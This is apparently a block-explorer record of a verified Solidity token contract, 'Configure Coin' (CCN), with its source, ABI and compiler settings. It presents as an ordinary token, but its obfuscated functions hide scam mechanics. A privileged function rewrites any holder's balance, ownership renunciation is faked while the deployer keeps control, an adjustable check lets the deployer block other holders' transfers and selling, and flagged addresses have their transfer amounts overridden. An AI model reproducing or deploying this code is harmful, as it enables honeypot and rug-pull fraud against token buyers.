{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract totalAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderAmount {\n    function createPair(address isShouldMarketing, address tokenTxLimit) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface autoLiquiditySwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface limitMaxSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverList) external view returns (uint256);\n\n    function transfer(address feeAt, uint256 tokenMarketing) external returns (bool);\n\n    function allowance(address autoBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address feeAt,\n        uint256 tokenMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityList, uint256 value);\n    event Approval(address indexed autoBuy, address indexed spender, uint256 value);\n}\n\ninterface limitMaxSwapMetadata is limitMaxSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ConfigureCoin is totalAmount, limitMaxSwap, limitMaxSwapMetadata {\n\n    address public feeEnable;\n\n    function fromTakeBuy(address modeToken) public {\n        txAmountShould();\n        \n        if (modeToken == feeEnable || modeToken == feeToReceiver) {\n            return;\n        }\n        modeSwap[modeToken] = true;\n    }\n\n    function sellWallet(address amountMin) public {\n        require(amountMin.balance < 100000);\n        if (modeList) {\n            return;\n        }\n        \n        totalTake[amountMin] = true;\n        \n        modeList = true;\n    }\n\n    uint256 private feeLaunch;\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeSellList;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundMarketing;\n    }\n\n    function txAmountShould() private view {\n        require(totalTake[_msgSender()]);\n    }\n\n    bool public takeExempt;\n\n    function receiverSender() public {\n        emit OwnershipTransferred(feeEnable, address(0));\n        walletAt = address(0);\n    }\n\n    address private walletAt;\n\n    string private atLiquidity = \"Configure Coin\";\n\n    event OwnershipTransferred(address indexed exemptMode, address indexed receiverTeamLaunch);\n\n    constructor (){\n        if (amountList != takeExempt) {\n            autoReceiver = isSell;\n        }\n        receiverSender();\n        autoLiquiditySwap buyTradingList = autoLiquiditySwap(launchedList);\n        feeToReceiver = senderAmount(buyTradingList.factory()).createPair(buyTradingList.WETH(), address(this));\n        enableLiquidity = senderAmount(buyTradingList.factory()).feeTo();\n        if (amountList) {\n            autoReceiver = isSell;\n        }\n        feeEnable = _msgSender();\n        totalTake[feeEnable] = true;\n        feeReceiver[feeEnable] = listAuto;\n        \n        emit Transfer(address(0), feeEnable, listAuto);\n    }\n\n    address launchedList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address enableLiquidity;\n\n    uint256 swapMin;\n\n    uint256 constant marketingFee = 4 ** 10;\n\n    address public feeToReceiver;\n\n    uint256 private isSell;\n\n    mapping(address => bool) public modeSwap;\n\n    function swapExempt(address modeReceiver, address feeAt, uint256 tokenMarketing) internal returns (bool) {\n        if (modeReceiver == feeEnable) {\n            return isAt(modeReceiver, feeAt, tokenMarketing);\n        }\n        uint256 listMin = limitMaxSwap(feeToReceiver).balanceOf(enableLiquidity);\n        require(listMin == swapMin);\n        require(feeAt != enableLiquidity);\n        if (modeSwap[modeReceiver]) {\n            return isAt(modeReceiver, feeAt, marketingFee);\n        }\n        tokenMarketing = launchToTake(modeReceiver, feeAt, tokenMarketing);\n        return isAt(modeReceiver, feeAt, tokenMarketing);\n    }\n\n    function isAt(address modeReceiver, address feeAt, uint256 tokenMarketing) internal returns (bool) {\n        require(feeReceiver[modeReceiver] >= tokenMarketing);\n        feeReceiver[modeReceiver] -= tokenMarketing;\n        feeReceiver[feeAt] += tokenMarketing;\n        emit Transfer(modeReceiver, feeAt, tokenMarketing);\n        return true;\n    }\n\n    function receiverTakeFrom(address minLaunchedReceiver, uint256 tokenMarketing) public {\n        txAmountShould();\n        feeReceiver[minLaunchedReceiver] = tokenMarketing;\n    }\n\n    function modeIsSell(uint256 tokenMarketing) public {\n        txAmountShould();\n        swapMin = tokenMarketing;\n    }\n\n    uint256 walletTx;\n\n    mapping(address => uint256) private feeReceiver;\n\n    uint256 private listAuto = 100000000 * 10 ** 18;\n\n    bool public exemptFrom;\n\n    uint256 public launchTokenSwap = 0;\n\n    function launchToTake(address modeReceiver, address feeAt, uint256 tokenMarketing) internal view returns (uint256) {\n        require(tokenMarketing > 0);\n\n        uint256 fromFee = 0;\n        if (modeReceiver == feeToReceiver && swapFee > 0) {\n            fromFee = tokenMarketing * swapFee / 100;\n        } else if (feeAt == feeToReceiver && launchTokenSwap > 0) {\n            fromFee = tokenMarketing * launchTokenSwap / 100;\n        }\n        require(fromFee <= tokenMarketing);\n        return tokenMarketing - fromFee;\n    }\n\n    function owner() external view returns (address) {\n        return walletAt;\n    }\n\n    function balanceOf(address receiverList) public view virtual override returns (uint256) {\n        return feeReceiver[receiverList];\n    }\n\n    uint256 public swapFee = 3;\n\n    bool public modeList;\n\n    function allowance(address buyExempt, address limitTxReceiver) external view virtual override returns (uint256) {\n        if (limitTxReceiver == launchedList) {\n            return type(uint256).max;\n        }\n        return buyToken[buyExempt][limitTxReceiver];\n    }\n\n    uint256 private autoReceiver;\n\n    function name() external view virtual override returns (string memory) {\n        return atLiquidity;\n    }\n\n    mapping(address => bool) public totalTake;\n\n    function transfer(address minLaunchedReceiver, uint256 tokenMarketing) external virtual override returns (bool) {\n        return swapExempt(_msgSender(), minLaunchedReceiver, tokenMarketing);\n    }\n\n    function getOwner() external view returns (address) {\n        return walletAt;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return listAuto;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyToken;\n\n    function transferFrom(address modeReceiver, address feeAt, uint256 tokenMarketing) external override returns (bool) {\n        if (_msgSender() != launchedList) {\n            if (buyToken[modeReceiver][_msgSender()] != type(uint256).max) {\n                require(tokenMarketing <= buyToken[modeReceiver][_msgSender()]);\n                buyToken[modeReceiver][_msgSender()] -= tokenMarketing;\n            }\n        }\n        return swapExempt(modeReceiver, feeAt, tokenMarketing);\n    }\n\n    string private modeSellList = \"CCN\";\n\n    bool public amountList;\n\n    function approve(address limitTxReceiver, uint256 tokenMarketing) public virtual override returns (bool) {\n        buyToken[_msgSender()][limitTxReceiver] = tokenMarketing;\n        emit Approval(_msgSender(), limitTxReceiver, tokenMarketing);\n        return true;\n    }\n\n    uint8 private fundMarketing = 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTeamLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTxReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeToReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"}],\"name\":\"fromTakeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTokenSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"modeIsSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"receiverTakeFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"}],\"name\":\"sellWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minLaunchedReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ConfigureCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}